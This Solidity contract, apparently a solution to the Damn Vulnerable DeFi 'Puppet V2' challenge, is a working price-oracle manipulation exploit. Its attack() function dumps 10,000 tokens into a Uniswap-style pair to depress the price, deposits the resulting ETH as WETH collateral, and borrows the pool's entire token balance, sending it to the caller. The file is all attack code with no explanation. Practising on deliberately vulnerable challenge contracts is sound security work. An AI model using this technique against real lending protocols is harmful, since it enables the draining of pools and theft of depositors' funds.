// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
// import "../puppet-v2/PuppetV2Pool.sol";
import "../DamnValuableToken.sol";
// import "../WETH9.sol";
interface UniV1 {
	function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external returns (uint[] memory amounts);
}

interface WETH {
	function deposit() external payable;
	function approve(address spender, uint amount) external returns (bool);
}

interface IPuppetV2Pool {
	function borrow(uint256 borrowAmount) external ;

	function calculateDepositOfWETHRequired(uint256 tokenAmount) external view returns (uint256) ;
}
contract PuppetAttackerV2 {
	UniV1 public uni;
	IPuppetV2Pool public pool;
	constructor (address _uni, address _pool) {
		uni = UniV1(_uni);
		pool = IPuppetV2Pool(_pool);
	}
	function attack(address token, address[] memory path) external payable {
		DamnValuableToken(token).approve(address(uni), 10000 * 10**18);
		// address[2] memory path= [token, weth];
		uint256[] memory output = uni.swapExactTokensForETH(
			10000 * 10**18, 
			1,
			path,
			address(this),
			block.timestamp + 100
		);
		require(output[0] > 9 * 10 ** 18, "should be more than 9 eth");
		uint256 x = DamnValuableToken(token).balanceOf(address(pool));
		require(pool.calculateDepositOfWETHRequired(x) <= address(this).balance, "not enough eth");
		uint256 h = address(this).balance;
		WETH(path[1]).deposit{value : h}();
		WETH(path[1]).approve(address(pool), h);
		pool.borrow(x);
		DamnValuableToken(token).transfer(msg.sender, x);
	}

	receive() external payable {
	}
}